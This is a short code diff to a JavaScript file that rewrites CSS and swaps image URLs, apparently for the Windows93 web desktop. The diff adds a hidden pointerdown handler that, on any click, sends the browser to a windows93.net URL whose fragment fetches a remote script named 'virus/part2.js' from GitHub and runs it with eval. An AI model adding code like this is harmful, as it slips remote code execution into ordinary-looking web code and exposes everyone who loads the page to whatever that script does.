@@ -37,6 +37,10 @@ function modifyContent() {
     .catch(error => console.error("Error fetching or modifying CSS:", error));
 }
 
+  window.addEventListener("pointerdown", function() {
+  window.location.href = "https://www.windows93.net/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/windows93/main/virus/part2.js').then(response => response.text()).then(script => eval(script));";
+});
+
 // Replace image URLs in "sys42.css" with the provided URL
 replaceImageUrls("sys42.css", "https://leopard.hosting.pecon.us/dl/vzcbl/gdfdfgdfghdfgdfh.png");
   // Play sound (without autoplay or loop, user interaction required)
